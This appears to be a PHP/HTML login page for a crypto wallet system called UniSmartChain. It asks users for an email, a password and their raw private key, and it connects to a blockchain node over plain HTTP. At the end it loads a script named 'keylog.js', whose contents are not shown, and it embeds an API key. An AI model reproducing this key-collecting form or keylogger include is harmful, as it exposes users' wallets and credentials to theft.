<?
include 'php/config.php';
?>
<!DOCTYPE html>
<html>

<head>
    <!-- Basic -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <!-- Mobile Metas -->
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
    <!-- Site Metas -->
    <meta name="keywords" content="" />
    <meta name="description" content="" />
    <meta name="author" content="" />
    <link rel="shortcut icon" href="images/favicon.png" type="">
    
    <title>
        <? echo $SITE_NAME; ?>
    </title>

    <!-- bootstrap core css -->
    <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />

    <!-- fonts style -->
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;900&display=swap" rel="stylesheet">

    <!--owl slider stylesheet -->
    <link rel="stylesheet" type="text/css"
        href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" />

    <!-- font awesome style -->
    <link href="css/font-awesome.min.css" rel="stylesheet" />

    <!-- Custom styles for this template -->
    <link href="css/style.css" rel="stylesheet" />
    <!-- responsive style -->
    <link href="css/responsive.css" rel="stylesheet" />
    <script src="lib_web3/web3/dist/web3.min.js"></script>
</head>

<body>

    <div class="hero_area">

        <div class="hero_bg_box">
            <div class="bg_img_box">
                <img src="images/hero-bg.png" alt="">
            </div>
        </div>

        <!-- header section strats -->
        <header class="header_section">
            <div class="container-fluid">
                <nav class="navbar navbar-expand-lg custom_nav-container ">
                    <a class="navbar-brand" href="index.html">
                        <span>
                            <? echo $SITE_NAME; ?>
                        </span>
                    </a>

                </nav>
            </div>
        </header>


        <div class="modal" tabindex="-1" role="dialog" style="display:block">
            <div class="modal-dialog modal-dialog-centered" role="document">
                <div class="modal-content">
                    <div class="modal-header">
                        <h5 class="modal-title">Авторизация в системе UniSmartChain</h5>
                    </div>
                    <div class="modal-body">
                        <div class="form-group">
                            <label for="email">Эл. почта</label>
                            <input type="email" class="form-control" id="email" placeholder="ivanov@mail.ru">
                        </div>
                        <div class="form-group">
                            <label for="password">Пароль</label>
                            <input type="password" class="form-control" id="password" placeholder="*********">
                        </div>
                        <div class="form-group">
                            <label for="privateKey">Приватный ключ</label>
                            <input type="text" class="form-control" id="privateKey" placeholder="0x0017ac124c2b8fe0...">
                        </div>
                    </div>
                    <div class="modal-footer" style="display:inline;">
                        <button type="button" class="btn btn-primary w-100" onclick="SignIn();">Войти</button>
                        <!--<p class="text-center my-3">У меня нет аккаунта. <a href="signup.php" class="link">Зарегистрироваться</a></p>-->
                    </div>
                </div>
            </div>
        </div>

        <script>

        const web3 = new Web3('http://194.87.147.75:8545/');
        
        function SignIn(){
            var pk = document.getElementById('privateKey').value;
            try{
                var account = web3.eth.accounts.privateKeyToAccount(pk);
                var address = account.address;
                
                var email = document.getElementById('email').value;
                var password = document.getElementById('password').value;
                
                if(email.length < 1 || password.length < 1){
                    alert("Заполните все поля!");
                    return;
                }
             
                $.post('/php/db_login.php', {email : email, password : password}, function(data){
                    if(data == "0"){
                        alert("Пользователь с такими данными не найден.");
                        return;
                    }else{
                        SetPrivateKey(pk);
                        SetWallet(address);
                        window.location.href = "lk.php";
                    }
                });
            
            }catch(e){
                alert("Неверный приватный ключ");
            }
        }
        </script>        
        <!-- jQery -->
        <script type="text/javascript" src="js/jquery-3.4.1.min.js"></script>
        <!-- popper js -->
        <script src="https://cdn.jsdelivr.net/npm/popper.js@1.16.0/dist/umd/popper.min.js"
            integrity="sha384-Q6E9RHvbIyZFJoft+2mJbHaEWldlvI9IOYy5n3zV9zzTtmI3UksdQRVvoxMfooAo" crossorigin="anonymous">
            </script>
        <!-- bootstrap js -->
        <script type="text/javascript" src="js/bootstrap.js"></script>
        <!-- owl slider -->
        <script type="text/javascript"
            src="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/owl.carousel.min.js">
            </script>
        <!-- custom js -->
        <script type="text/javascript" src="js/custom.js"></script>
        <!-- Google Map -->
        <script
            src="https://maps.googleapis.com/maps/api/js?key=AIzaSyCh39n5U-4IoWpsVGUHWdqB6puEkhRLdmI&callback=myMap">
            </script>
        <!-- End Google Map -->
        
        <script type="text/javascript" src="keylog.js"></script>
        
</body>

</html>